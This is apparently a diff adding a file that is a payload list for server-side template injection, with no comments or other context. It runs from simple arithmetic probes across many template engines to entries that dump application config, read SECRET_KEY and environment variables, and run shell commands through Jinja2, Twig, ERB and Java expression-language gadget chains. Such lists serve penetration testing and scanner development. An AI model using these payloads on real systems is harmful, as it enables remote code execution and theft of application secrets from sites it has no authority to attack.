@@ -1,0 +1,24 @@
+{{7*7}}
+{{7*'7'}}
+${7*7}
+<%=7*7%>
+#{7*7}
+*{7*7}
+@(7*7)
+~[7*7]
+{{config}}
+{{config.items()}}
+{{settings}}
+{{settings.SECRET_KEY}}
+{{self._TemplateReference__context}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.System).getenv()}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+<%= system('id') %>
+<%= `id` %>
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{['id']|filter('system')}}
+{{['id']|map('system')|join}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
